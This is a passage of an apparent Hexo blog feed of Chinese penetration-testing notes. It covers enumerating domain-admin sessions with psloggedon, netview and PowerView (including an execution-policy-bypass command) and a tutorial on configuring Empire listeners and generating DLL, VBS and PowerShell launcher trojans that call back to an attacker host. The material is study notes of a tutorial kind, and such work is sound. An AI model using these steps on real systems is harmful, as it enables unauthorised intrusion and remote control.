eabbfa7d5bd0971c0ea33dc14ac3b01f2964579cd445408adf4acb6ea822b4c5aea07114ffcb21491d14abbed4d08a12a026950da7bc3f20a959c3de5d67a28aacc842762ee022679af980e503318d4b588d2dd85b12769b40c5f6d6749a52e88ecb2a47da08d00b23f64855261d167a52e8ae1a4b44346a40140e5efbeb301511be850866ef718f10876258e01ad839356842e2231d48355975f769f6970f16099b67ebfe69025b29fc8125a70ae564fe27e84dd6affea8fdc1bfbe500a6573d1269414d60f9422e19784edecdffa72cd37ffe3f495e1a78b339e9a124b834d8338744cc1e1d6a0e7108840f59d3905d3952ccfeffbc2ec2710ba06abb94b6f4e0555c415f9e3178e939948bda207819569cb32203027972cee71a263f5c065f6270b0588930e8f118dc0b4f8ae4ae05236a6c2d4f1eba4959c2ec4cd0c2299a2bc57dce40b133e6aef2676dc868636e8ba81643d45eeadfc576f02ff94408fbf77880b55e4804959c82896435be45fcf7876133e1d8ba52184163d8032d485b3492e37fde73ca35c20c3720fbdfe236f7cd8e948d8c954844e6e68eff280bb0977a72940e3bfeaa56c2bad463f44e2aca6dd87e790d17c3d9b238d8e545be7720863b0cab466e7de507f51974b6348988d3c9b8692643c4a6baa963319b67aadb00faf47b5ac16e1d025b5ed775c686c3d0e79c1f9f6f5928e330339756609fa0c288c40199fe502c0dd16c8a9d3055d66b7e6f985b1dc5f6b28cefbc5280fcbe3787649f1f2ffbffe869186a4c963105226a9bd371503e6076dd7fd5901b52ec69a2094b72a9e0373069806e680d5d7bbf7bc4db3942897416fc04070f881e4dd87e69b0761be951c7bddd92a518ede6af5a21c4821c1d2f73ed50570f23b92b3f5901e30acf339fc024f174dca74b71c05572789508631242e401167182a5468d61e16f484b89ab210ba4dd8c0987c6fc9a5da36fecdb1a51af4183bef732a2c83ca25c8d837a0bf9cbcc035b0a9ecf3460264dc3e405d4650494310a29345f51f3925965200d2ef65db22fef03bf23701a6b8227cf4ee176e23e5c0e1d15ae84def23f94e3e9da41d561e894151852b78c20c84fdc3341deb21fee2b5018d9fb11f149149fb783e68ce13f431c11922f7a43bd411ca8e7f083d89b8c1a4e2f9fbebc22dd75cbdfb0b1738588aa7c808a4ed348569c009862ec93b8dc9132978fe96204d1f54435ce6f8275135f1f46283df075d88a795c332bb7037bb304597ca2111e775d97332142345a3182b763fff348b7713a700f2f485786feabee398589cdc52c9fa2a9830205dbefd1497171662c5d16381dc37e37729a04277fc1650b68954c2c17a0cd1a6736106854543ddd4c785c0111a644abd00df2bfbaf25145dc43d6a281d88c81725cf7f54f8004c182766add726dbcf3a7fccb5cc49740e22855c5452889e89bed99b09c7ed0b0d05585c4c84d111360823f2744fa8269e9d1be32e6cd2928578ff71c9856d8bca15c2ca66de45143c2029abe499986874ec01a6674933f54889bd4114b4f1e426b6fecde3b7efb2f172350ac536fd4aa41a9d7a4e96fc10446bfbdf4d51a6a3bbce712c6c6c115741072ed5c969dae3709f32be93e32e2d3a36fa0d5d91aceae8e5dd1e90f8ffbe1935e910042f120d77c03883429b99bf0f1c98be3f323ec68b1276b3294d1a62c67e7cd4f6f46e4d8b4397239b98ee6184f9dbada8d5d1027ab63f65381e2fc402ec1369285be8a7cae5024f2868f2d87b77bcff155ffe1a5a5fc8a48b8518f987fecae27fe557c3a6239fdd572330eb08218d9b2ef08601e3c34ef5c6f81bff95704480221099c1fa0786dfdfa60ca491eb961e48055c50872998c6e81d0642afddad8504fcd65078d23662eb560b1ea7d40e6cae64af74ff9efc81f3a125b536e5f6a1cdd015061c0f7478275901ad316962abc335dd507ae5ee48f2fee0fcd8de308c43510b68fa92ad2900a3438d31c86df4827b93e11a62e295c6a875447226fce90c86f84269d758dd3f38e08b4b275d641a25f0c83ca717e2e93b594d6d52850dafe370114b5dc3bb951b0d5997356ef637d3ac5dff1eadcc5b0f5f50d289605a485fbe315130cae3b42ae174a8d8930cf11ce554ecc8c770815c62b91174450357ad3f01603da715827e7a330ccb54b74dc44b9385a705caee212c146095add3522c4f7ade3dc2a4f2c278a0f0deb522a5c78fab4e86804fa68763cb47f83d1d52626a0b4e2f21ada2a68acfb81faa977f4216c694273e7f749c6cd02b1da65703edb284ac48c1098ff304e390c19af49c15bdb6989d66cb7c28654b7d355f0fbee954a42c36a5ee5542ff8e6eb242b44729aa46946414e8d65758a776b3ff9d1821d8ac0d86e20d7b806eab235ba1353a7eac0c032d4453a86ab360994ef977040599beebb43732a2adf430947912b5f26d993d59b097c91aac4224a0ca1e9a345cfc34532b4bd5859a0d4bac2f1b78db50be1abd7a18ef329879230a887a38cd6b1eb767630122c2b9bdda5dbdbd278667fd5af5a5b60b5a9efd5b049377cff1b10c5ae2320d343a4d64b6c89815dcca701374c735b34c67ee46ae3d1e66563dc8eab9316861b6093c0ec57b42ddc5a77921e6552594721adfc4ef032ea62b0ed5562ccf0c95b98219593d12c8e6634f44ccc371ce1b5aeedda7fea0f57265200e2a6c2694d4a99f2bfabde9a08d8e365b45de3bc01bc52c557a820243a249ffd1cc5b05714e03b53981449fd96a472be71d75885f31cbaeac46002bf37ecdf50132d64b594fa11bc28d37485682a95bf7a906d6c6802577fd819772236d405f3be49f1e3e4e51093c4835ade081d25783b9e2858622122fe53a19172f234586dcea1c5a92af72825db8aed3d085a119d964efa156ab69b87f02e67d2e236351ad8e6ccbf6b202608638c790f7612bcdf457b753aeae267540de07f69c46b540049f8e95d05d2defbb6d94fbdad0a5d8699fc32461f3d93f9c718b0b9da18111c5f6a79af16e150984bb454527250a697d3c16da18f809064f71dcd13c62f6727624bf6330e600e2ea43df840ae4b7555297ab62f77e4ce5f5109bb1e59df5bf780e3715316c9fc7c2af196bf0d387ecf26f1c3b3aa110cb5b2a57f252566536d99b4fe4aab04a0b0efd69fb82278ad233ac356783de9dfa1f35c527e0f2d1ca13e8c87379a12cb3eaa2dc3d406660dd007bfaf7b922683aad628bf2f1e65dd52bb92c8f69926e412dd1b46fea1c0d3e7cbc0d9f9120080b65a29497db4f3064234447ef71e4302e80c2105ff8f218897c96396f94e467b43ddac36b39a17345b2a69f5713859afc03287a0c9ce3b453b47f59226281edfbb0b448005492cc63d385a3d4ea675129d94e73ae57f61e451b53eb72db4001830a1b69bd0ddf825234e73f3ceef305f7468e7e71f548ac6cea6c000f1c0023d91a021282fac2ce795da5fc4bcbdc391933e5d8c2b49a55098323d72213e7edaa94c585001ce5641e2ef1c6e277e539476aced537f61ece764a1e1fc0fe792811da8d2a8d46a73451828efebeeb0a3a7b96b224afe508ae67e8258e210de9a382a6b8b2b90e5659703a0923c632844af4443b8130e542e9b024134dd7b34d678cff92f3fc04d9ff6a85dfa30fadf60954f69b8684c2444255c354460b7fb876881558e4909c0a93842d12688eaf0bc19e484760360c38ae28d33d8617a27924f4de0f78ac76b6f81b06a31f4943957644cbf67db856741efc077f0cda022019b637d8405ca4505914f104a33f9205e4b0c81f1b481b4fd07348818f66367dd2496ad8ac6e63ed42e24367e8d12a7e5dff600a0222905ac7ffb5d7c923bd96be7b193ea0f34081edf606e6e0e450cf43d76d620a17116a09693848692e2d6e3c25715664f0ed24c587e70a805fdbd684060da83f7ab66ff71a04b139f2945b7dde241cc633f109d9d7e3168222666518bf59cb84b5f38944515ab9a0ae6a94913f642c70923fb40dde9d9c5372ed8a1de36593cbb90f886866d83294cf3fa40c08986b09e595eaca75926aebd1960fa957a2c6219dd92790752aed214516fe48b2d2f0eb117e302e87a14a1d531030ef0fcd50fcbe9f9a1512af1a0856137566d85db451431de08dbaebf58d2e293a97a49c3609ebe13c3a98f463a9563455cec393baee6f802d2d8310eaf8758ad41a6ee4f319bc46f8fe726193bbf951298c0ea16e0d1ead2058951c5da518b6e4388ecf3e650dc1ff21b8636e5408a07e2568e240bc4560ed6f09095503b8bce76c9fc4c4a2c87b651a4cb99c01340493782971ba7fb9b56b5b685d6263f8ad19c10ae52d03d2b0158b6bc2eb4938e8f5491477e0da9f79d9476765eeae87acf77ca9646355478fdd9e3a2e450203f6bab3dced944d1e0d58f3de683ff71ee3fbc76b406ce55f1e46691eb8f4289b5a5221d5d7609e7bfc42310254952164e1a3eff8904072bc6c881c884deb9a3f0e8647319539471ff8585e438fdd0434cdc17e886b828529b841b4d568abcceb23232db4e90ae356adb22a5909c194f72eb4dd40d13753d126bd510e2d076ec3441b07c0c32b9545c954fa16dd1efd14d6dfed3bcb3e8a11f3e11128540309b9696081ba3f2adba57119412952c4396d22b43aeb25e48c959cac97bc7f02584512ccca157de74f0bb516f079421e1c25d47b9fc618208ee8c47f5e861ad8c3a4177999d7b2c788e285327ee07ef7a50bdc7abb57c2f7cb4aa67e84b34a35fc8f6e8a81535cfa9ca415c120976d71a7406f232bf5ef0dc2bbb9ecb904317e46472a770b65a11b9dc0da8f3a38dd7a6680ab914ec38f6d1cfb7d4832dc5f0f66519caefa6b1c0183874d3d66488251088495868e590c7209cf0c91545b26cc21af17cb30a705a1774407849c95f52c73cf68817423851e619892a9c675fc1bd5da90b133e4327231bce5ebe166ad470409a0fcd9ff88febe43842ec4951cdc6cff716319a744fdd4bcbe39141125dbd6d6bc36dfbb33793b40c16340b684ba0c96aee2a3e8a51614c04a1de0eb257f03372fc336cf2c242f47f4b6cefe721e3efff3e09ac7f894789681a93fbb6e2a6cb57a54dd5dfa75690c24957bb427bc8974463f70d17fd6b6dbac944a08361f3c2a5c4b21c26ac6ff17a94a22a0587b4fd6c18ad8f45bbe436d85e7b1951f0113d35842cfe84567b299fb204ef7853008f7f5a2928815dda20aab9c18bcd8310b06f6a4065cbb87bf5246c93e0a1bd0f93e6727485fe70e2117ca412b8ecaa80b93bf30a297704378ab2e5eed7e7ee91731d11189f31ddc8f187c89b669f96e68919e3fa271e140fdafbab52cbc5aa13fcc5eba915fc97bb95048821aa87327cfcfd8c5da727e2ca65f61ad02179606b818b37ff4c141e9dc6a0e2014b5e2c435c4b423800749988f72a4a7c6bf99a366edf21356647d69ed667384abe3c18dc96be007c3499d8bc94e5f3282481328a6c28f911af843ba104fd2629749fc186979ae6e1ad0ffade2b780f3fbf09a71438522d7ece0ba505aea577f0f7d669636dfdb1d56648a4e52ed532c94af1e11ac2e53baf125cb22726b7860e9bb44986e89adc730a3efb0605f6b0e5e8d54566b75698ea2f3f0ef0221b4332a24341f46eb655f1b2af1b4a0c87d8a70574a0bb0f74e24934bc159aa9cc33828fe7b4ae133e7f1369e9207523fed40e90c5317c1e89ab9640aae3eb185dc02e3ab017f8372ae71a0fe12f3a0df873e34e6d6c7f82f03a3ecf5592beee8e89a892c877ca9ac3778fae126cf5a41d031693f19788b3a1928447e8de9616a4afa5adffb9a1eca2dbd07ec8b62df2b468ee709c437ac5aa64f229b9c4f24824c5e7cdce2f9577df07eebeabf8d7b6cabb16bb053cc29ff2f9f0f934b19d91ebffd9bff97ddfcf50d05433784e6a65d9a64693466529204c0e2bbbb273bcf391142147e47fdb861bd63e4b7902c2cd7c08ac2c9a611779e2dd5face774260d196fd40e3c0740f867db5fef975ff8d9d1f098bfb4059c9e8193ddccf8c8f3b9c63e7a14e1f388563cdcd89f28e59552c2461f543eff57caa09a6b403eed229d22d827740ba30148fc7ac6e981c219dc21c9e5b86c778dae94b0229697d9c446f4cea5322f51cd15bb07180b15771661dfb8b5e9706f34ef38efbe20d87d1e1ccea9771640e80521e2229d3109b61c981b690c43ab9b7dd87da426cf5b619848cc08d95843c06fdeb65c13f54746aa691fe771da1db9a9393c83c6a2dd21d939c52ace52710b8c05ef9c48cf617b27334c2bd4b9334bc0e86d239402f2c401ef242ee9453ef05a9d026c4e870f31bb4adbd8dcc39385db93a27d5f746f3491c6fcb8efafbe014625fc31d84738eb5cf01bc73e552e9ca129c708e850c9f1ad0f542815ff0782479304a5b5bc4554c1b747e377f7fda08817b4c931ca42cc4b42cf7a2178fdd5e8f8edbc0e34a2745f457c543cc28c0c54f36c0129ce1b47f9cb5cc0bf5023c2661ab4242337cd29e4fedb3d2b0adcb0f621229bd64d555d47ca133374447ec28a65b085cb5c8d8e57e46d2f30df26a3f6d60a5b3c61b64f45a6477b3c412554ede658e694410deb0aa4e2835d9c55face5b383a96743b7bdf8ccdda76b0a67138e6ccd3cdaa280a18432d8e3f47fb7a694a45928b85b8b1cb2ac3567643205f883fffdd0becc6bcc863687e84a015ecfe6235e211757e9b35af95641192eff56304dadbef59a6c6ae9c953ff9b813ac8813ea84fd9158a4fa99262e82c2e0e4f8e0188b3b2d4b0ef03ef2383a6ac20c15b9f30006f951d732ea4b17498bb786ce8194745743fccf7d9987f5bb29381470c98b8378135c19a3f305dc906d357e14e828e3c83ea9ff5c78efc520c69a28ae1c48e7c2b587fadb3d26b39a1563ac1740fdf7a1a1ca22b9a64c5107f1e143b741e2a6573a6fd7736c4beccf9e5f3353fab1b449bad60c43b6766c7547b2c89967b1b8701e5333b68a5fa6a0b2a3fa817d980d56ec75d1d454fda9ab99ec08f5952b9cb8d05eb4832628425d080af1c48f0d38ebd8c8b174b6c4512c5bc8e99f72f6fc7e2e485bdbc3fd9b4e8895b0791f25cec8e4820c1714b0562be2fb41fd217fb3a5d9bffb93d5a183cbacf9a67267cd9654f2468d8df3783ac3d36199892036626dc5db8738214388ac14ba9b9b488b7bc16556e28bd1bed69193cd4afe515b44f1b75649f5a478fab9818d94defc71b10e6ffe94c600ac75938604aac9c062e71c998e443ba55b798cd51dae4d80276e577bffb23337cbd69813f65a00a266d33434bb8427895d10d5e830fec751d34884e3d6163fea3531253ad43f44ff0b4a0d54bf02648778771c4dcadbc0b3ab416324a2e000095fe8a62f39e96056eb3ee3af0d1152db70492ebfd022df3735f21e8727fe6bdd3979fd00ca8673cfda9c2180ceeb3e95a27004e83fc79b55a087ef42485e3fb351295edbd258253d237662a42efaf3a3d04a1ec8fac0ea43694509684ca23816b9932be7a8fee7dca148ce1779e55fc915492074c0bbf0c5ed2f0f9679d415d9c3914fa2ff80a809e963a2c1bea1e138527c9fe81ce14254ce2c4aa2c5ec32ca51786da6e1f34260c873af606eb42d204bd8524630d558e374cb2294a8ea9c5984e53b9d68cec3859f0cde5ee4b1ce6bb6f626d16d78278950b9c12639a629d7c0533887f12259a7e0432df4477108c147c6aab0a2fbc66210637957133ea05da7f9bdd9f99fba130377e9dda36b9932e7c1320654ca78ae2456d54600b169b0da61c08f4b1e0b21c34d5cc56ae23a6f0f98da76ee2c97f5b069d9e98f44691c1a030fbfbc12e01c30773f181bcba5d6bfba8003131943e4c849101daab5b24a1182ff62de00c2fd3951fc007cb5cd3209d51d9f49b4f98d431abbe8629ff3035f1a2b214393d1b5428d4e077dc15743a5bdacb1895efa3af511ce0ed4bc8ea14126127e49d12601d79635b023f4d222a22a7c515dc9ff93417d064dd4d8e03f24932b812a473b52d2997c8f7defb231ff5af9db57b6bb66be7b2ca6245bb88f103c4fecff7e0fbc7b6df579ee7692da0d4c727d1aba11cf10518d76b8d10b00b10ba6c9b2594177d13d4a2ce95f2abb22176d2c1f519ecd04f5ece3834f5e890c60c14c01f70c3e35fc52744218d6d9050f33e62a6c087f3e257a293651fef57831f9ab8bef7d9ea6d7234a295ca3744294fa74a129646b9ecc138b1e3f540d1ff82868d1fbdd3d2609898ef73f2b2e96f29e01544a89f539eeeb5c69b27a7260c101c0cadc53e1d2be5973a7574fbd825b54a38b23b52d4ae10ce433ad622b6cf155da253e5c8e51b7ef3b207bd3755afeb9c51944e2f079f539aa884c0d3af3853f90ce531a2a0182bd7bde3cdd4d4e273b853654384ea73c9922861a37739bcfd52cce45cd31d7c7ac7cfd1b74c066984fc697b803a0bf124af02606b076a6837113ff1389a95a54e2ab2fa0dd2b80f20c60163db9fdf40a5334f77e82d4c06e4cc3b27b9028bbdfe3d419fa1ec04a23dd193db0c6f2fcf81f3e3f01e63f1e8b8c7bcda87b10d4c643ae6db41e9b60fe506511eadd91acbf36706900106240549a66adeeda39e5b6d74a923f6fc25d5e152255ab07044640b400d63dacc9df7763d380c001425b38c828a47030dcf0ca2aeee802eb099758df4c5f169beddbe50aa1dc28f9ef5c9cc9dd3469ee9dc374bab5fabd8043a441d3be4eab380c61af8b01709712878c3c518cc9a142f3a6aed5b37d3b60fde06f2a4aa0f110ff97261fbfba2eb262fe8af66ba4ffe44f3cfb6ecfa853ec451dbe5280c77f89ed58c6ff6ba141417c6cafbc13e0edd5ef606d67818c3cd533117bab55df23f7eccef2384da99b46f587adf854020</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">当前文章暂不对外可见，请输入密码后查看！</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <categories>
      
      <category>内网安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>内网安全</tag>
      
      <tag>idea</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>定位域管理员</title>
    <link href="/2022/06/15/%E5%AE%9A%E4%BD%8D%E5%9F%9F%E7%AE%A1%E7%90%86%E5%91%98/%E5%AE%9A%E4%BD%8D%E5%9F%9F%E7%AE%A1%E7%90%86%E5%91%98/"/>
    <url>/2022/06/15/%E5%AE%9A%E4%BD%8D%E5%9F%9F%E7%AE%A1%E7%90%86%E5%91%98/%E5%AE%9A%E4%BD%8D%E5%9F%9F%E7%AE%A1%E7%90%86%E5%91%98/</url>
    
    <content type="html"><![CDATA[<p>内网渗透与常规的渗透测试是截然不同 的。内网渗透测试的需求是，获取内网中特定用户或机器的权限，进而获得特定的资源，对内网的安全性进行评估。</p><h2 id="域管理定位概述"><a href="#域管理定位概述" class="headerlink" title="域管理定位概述"></a>域管理定位概述</h2><p>  在内网中，通常会部署大量的网络安全系统和设备，列入IDS,IPS,日志审计，安全网关，反病毒软件等。在域网络攻击测试中，获取域管理员权限。<br>      在一个域中，当计算机加入域后，会默认给域管理员组赋予本地系统管理员权限。也就是说，当计算机被添加到域中，成为域的成员主机后，系统会自动将域管理员组添加到本地系统管理员组中。因此，域管理员组的成员均可访问本地计算机，具备完全控制权限。<br>    定位域内管理员的常规渠道，一是日志，而是会话。日志是指本地机器的管理员日志，可以使用脚本或Wevtutil工具导出并查看。会话是指域内每台机器的登录会话，可以使用netsess.exe或PowerView等工具查询(可以匿名查询，不需要权限)</p><h2 id="常用域管理员定位工具"><a href="#常用域管理员定位工具" class="headerlink" title="常用域管理员定位工具"></a>常用域管理员定位工具</h2><p>常用的域管理员定位工具有psloggedon.exe,PVEFindADUser.exe,netsess.exe,以及hunter,NetView等，在powershell中，常用的工具是PowerView。<br><strong>1.Psloggedon.exe</strong><br>在windows平台上，可以执行命令”net session”来查看谁使用了本机资源，但是没有命令可以用来查看谁在使用远程计算机资源，谁登录了本地或远程计算机。<br>使用psloggedon.exe，可以查看本地登录的用户和通过本地计算机或远程计算机的资源登录用户。如果指定的是用户名而不是计算机名，psloggedon.exe会搜索网上邻居中的计算机，并显示该用户当前是否已经登录。其原理是通过检查注册表HKEY_USERS项的key值来查询谁登录过，但某些功能需要管理员权限。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">psloggedon [-] [-x] [-l] [\\computername| username]<br></code></pre></td></tr></table></figure><p><img src="/2022/06/15/%E5%AE%9A%E4%BD%8D%E5%9F%9F%E7%AE%A1%E7%90%86%E5%91%98/%E5%AE%9A%E4%BD%8D%E5%9F%9F%E7%AE%A1%E7%90%86%E5%91%98/image-20240107154537796.png" alt="image-20240107154537796"></p><ul><li>-l：仅显示本地登录，不显示本地和网络资源登录。</li><li>-x: 不显示登录时间。</li><li>\computername  指定要列出登录信息的计算机的名称。</li><li>username: 指定用户名，在网络中搜索该用户登录的计算机。</li></ul><p>下载地址：<a href="https://docs.microsoft.com/en-us/sysinternals/downloads/psloggedon">https://docs.microsoft.com/en-us/sysinternals/downloads/psloggedon</a></p><p>2.<strong>PVEFindADUser.exe</strong><br>PVEFindADUser.exe可用于查找活动目录用户登录的位置，枚举域用户，以及查找在特定计算机上登录的用户，包括本地用户，通过RDP登录的用户、用于运行服务和计划任务的用户。运行该工具的计算机需要配置 .NET Framework2.0环境，并且需要具有管理员权限。<br><img src="/2022/06/15/%E5%AE%9A%E4%BD%8D%E5%9F%9F%E7%AE%A1%E7%90%86%E5%91%98/%E5%AE%9A%E4%BD%8D%E5%9F%9F%E7%AE%A1%E7%90%86%E5%91%98/image-20240107154548642.png" alt="image-20240107154548642"><br>这里我的没连接成功，不知道为什么，希望有大佬告诉我。</p><ul><li>-u:检查程序是否有新版本</li><li>-current [‘username’]:如果仅指定-current参数，将获取目标计算机上当前登录的所有用户。如果指定用户名(Domain\Username),则显示该用户登录的计算机。</li><li>last[“username”]:如果仅指定了 -last参数，将获取目标计算机的最后一个登录用户，如果指定了用户名(Domain\username），则显示此用户上次登录的计算机。根据网络的安全策略。可能会隐藏最后一个登录用户的用户名，此时使用该工具可能无法得到该用户名。</li><li>noping：阻止该工具在尝试获取用户登录信息之前对目标计算机执行Ping命令。</li><li>target：可选参数，用于指定要查询的主机。如果未指定此参数，将查询当前域中的所有主机，如果指定此参数，则后跟一个由逗号分隔的主机名列表。</li></ul><p>下载地址：<a href="https://github.com/chrisdee/Tools/tree/master/AD/ADFindUsersLoggedOn">https://github.com/chrisdee/Tools/tree/master/AD/ADFindUsersLoggedOn</a><br><strong>3.netview.exe</strong><br> netview.exe 是一个枚举工具，使用 WinAPI 枚举系统，利用 NetSessionEnum 找寻登录会话， 利用 NetShareEnum 找寻共享，利用 NetWkstaUserEnum 枚举登录的用户。同时，netview.exe 能够 查询共享入口和有价值用户。netview.exe的绝大部分功能不需要管理员权限就可以使用。<br><img src="/2022/06/15/%E5%AE%9A%E4%BD%8D%E5%9F%9F%E7%AE%A1%E7%90%86%E5%91%98/%E5%AE%9A%E4%BD%8D%E5%9F%9F%E7%AE%A1%E7%90%86%E5%91%98/image-20240107154601537.png" alt="image-20240107154601537"></p><ul><li>-f filename.txt:指定从中提取主机列表的文件。</li><li>-e filename.txt:指定要排除的主机名文件。</li><li>-o filename.txt:将所有输出重定向到文件。</li><li>-d domain:指定从中提取主机列表的域。如果没有指定，则使用当前域。</li><li>-g group:指定用户搜寻的组名。如果没有指定，则使用 Domain Admins。</li><li>-c:检查对已找到共享的访问权限。</li></ul><p>下载地址：<a href="https://malicious.link/projects/netview.exe">https://malicious.link/projects/netview.exe</a></p><p><strong>4.PowerView脚本</strong><br>PowerView是一款powershell脚本，提供了辅助定位关键用户的功能。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">powershell.exe -<span class="hljs-built_in">exec</span>  bypass -Command <span class="hljs-string">&quot;&amp; (Import-Module .\PowerView.ps1; Invoke-StealthUserHunter)&quot;</span><br></code></pre></td></tr></table></figure><p><img src="/2022/06/15/%E5%AE%9A%E4%BD%8D%E5%9F%9F%E7%AE%A1%E7%90%86%E5%91%98/%E5%AE%9A%E4%BD%8D%E5%9F%9F%E7%AE%A1%E7%90%86%E5%91%98/image-20240107154616504.png" alt="image-20240107154616504"></p><ul><li>Invoke-StealthUserHunter ：只需要进行一次查询，就可以获取域里面的所有用户。使用方法为，从user.HomeDirectories中提取所有用户，并对每台服务器进行Get-NetSession获取。因此不需要使用Invoke-UserHunter对每台机器进行操作，所以这个方法的隐蔽性相对较高(但涉及的机器不一定全面)。PowerView默认使用Invoke-SteathUserHunter,如果找不到需要的信息，就使用Invoke-UserHunter。</li><li>Invoke-UserHunter :找到域内特定的用户群，接收用户名，用户列表和域组查询，接收一个主机列表或查询可用的主机域名。它可以使用Get-NetSessions和Get-NetLoggedon(调用NetSessionEnum和NetWkstaUserEnum API)扫描每台服务器并对扫描结果进行比较，从而找出目标用户集，在使用时不需要管理员权限。</li></ul><p>下载地址：<a href="https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerView">https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerView</a></p><p><strong>5.Empire中的user_hunter模块</strong><br> 在 Empire 下user_hunter模块用来查找域管理员登录的机器的。<br>获取反弹shell<br>使用命令<br>usemodule situational_awareness&#x2F;network&#x2F;powerview&#x2F;user_hunter<br>我机器出问题了就不演示这个了</p><p>参考：<a href="https://timeshu.github.io/2020/02/08/%E5%9F%9F%E7%AE%A1%E7%90%86%E5%91%98%E5%AE%9A%E4%BD%8D%E5%B7%A5%E5%85%B7/">https://timeshu.github.io/2020/02/08/%E5%9F%9F%E7%AE%A1%E7%90%86%E5%91%98%E5%AE%9A%E4%BD%8D%E5%B7%A5%E5%85%B7/</a></p>]]></content>
    
    
    <categories>
      
      <category>内网安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>内网安全</tag>
      
      <tag>定位域管理员</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Empire使用</title>
    <link href="/2022/06/15/Empire%E4%BD%BF%E7%94%A8/Empire%E4%BD%BF%E7%94%A8/"/>
    <url>/2022/06/15/Empire%E4%BD%BF%E7%94%A8/Empire%E4%BD%BF%E7%94%A8/</url>
    
    <content type="html"><![CDATA[<p>Empire是一款针对windows平台的，使用powershell脚本作为攻击载荷的渗透攻击框架工具，具有从stager生成，提权到渗透维持的一系列功能。 无需powershell.exe就可运行Powershell代理的功能，还可以快速再后期部署漏洞利用模块，其内置模块有键盘记录,mimikatz,绕过UAC，内网扫描等，并且能够躲避网络检测和大部分安全防护工具的查杀，简单来说有点类似于Metasploit，是一个基于Powershell的远程控制木马。</p><p>全部功能参照：<a href="http://www.powershellempire.com/">http://www.powershellempire.com/</a></p><h4 id="安装："><a href="#安装：" class="headerlink" title="安装："></a>安装：</h4><p>git  clone <a href="https://github.com/EmpireProject/Empire.git">https://github.com/EmpireProject/Empire.git</a></p><p>接着</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sh"><span class="hljs-built_in">cd</span> Empire<br><span class="hljs-built_in">cd</span> setup<br>sudo ./install.sh<br>./empire          <span class="hljs-comment">#即可打开</span><br></code></pre></td></tr></table></figure><p>和metasploit使用原理都是一样的，都是先设置一个监听，接着生成木马，然后在目标主机中运行该木马，我们的监听就会连接上返弹回来的代理</p><h4 id="建立监听："><a href="#建立监听：" class="headerlink" title="建立监听："></a>建立监听：</h4><p>输入Listeners   进入监听线程界面    可以输入help查看帮助</p><p>接着输入uselistener来设置采用何种模式，通过双击tab键可以看到一共有7中模式：</p><p>dbx,http,http_com,http_foreign,http_hop,http_mapi,meterpreter</p><p>使用http监听模式：</p><p>uselistener  http</p><p>然后输入     info       查看具体参数</p><p>通过set命令设置参数</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs sh"><span class="hljs-built_in">set</span> Name  shuteer<br><span class="hljs-built_in">set</span> Host XX.XX.XXX.XX:XXX (Empir所在服务器IP)<br><br>HOST是我们VPN的IP，所以就不做修改了，修改完后可以再次输入info，查看设置是否正确<br>然后输入execute即可监听<br></code></pre></td></tr></table></figure><p>输入back命令即可返回上一层listeners界面</p><p>输入list命令可以列出当前激活的listener</p><p>使用kill命令就能删除该监听</p><p>agents下：</p><p>kill all 杀死所有进程</p><p>remove all 删除所有</p><h4 id="生成木马："><a href="#生成木马：" class="headerlink" title="生成木马："></a>生成木马：</h4><p>输入usestaget来设置采用何种模块，同样双击tab键，可以看到共26个模块。</p><p>其中multi为通用模块，osx是mac操作系统模块，剩下的就是windows的模块。</p><ul><li><p>DLL木马</p><p>想要设置dll木马，首先输入    usestager  windows&#x2F;dll</p><p>然后输入info命令查看详细参数。</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sh"><span class="hljs-built_in">set</span> Listener shuteer<br>execute     <span class="hljs-comment">#生成木马</span><br>就会在tmp目录下生成名为launcher.dll木马<br></code></pre></td></tr></table></figure></li><li><p>launcher</p><p>如果只需要简单的powershell代码，在设置完相应模块后，可以直接在监听器菜单中键入:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">launcher    &lt;language&gt;&lt;listerName&gt;<br></code></pre></td></tr></table></figure><p>将很快生成一行base64编码代码，这里输入back命令回到listener下</p><p>然后输入launcher powershellshuteer(当前设置的listener名字)命令来生成一个payload.</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">launcher  powershell <span class="hljs-keyword">shuteer </span>    <span class="hljs-comment">#生成powershell代码</span><br></code></pre></td></tr></table></figure></li><li><p>launcher_vbs木马</p><p>输入usestager windows&#x2F;launcher_vbs</p><p>输入info   查看设置参数</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sh"><span class="hljs-built_in">set</span> listener shuteer<br>execute                  <span class="hljs-comment">#生成的文件在tmp目录下</span><br></code></pre></td></tr></table></figure><p>最后输入back回到listener开始监听</p><p>如果要生成powershell代码，设置完listener后不输入execute，直接输入back,然后输入launcher powershll shuteer即可</p></li></ul><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">launcher   powershell 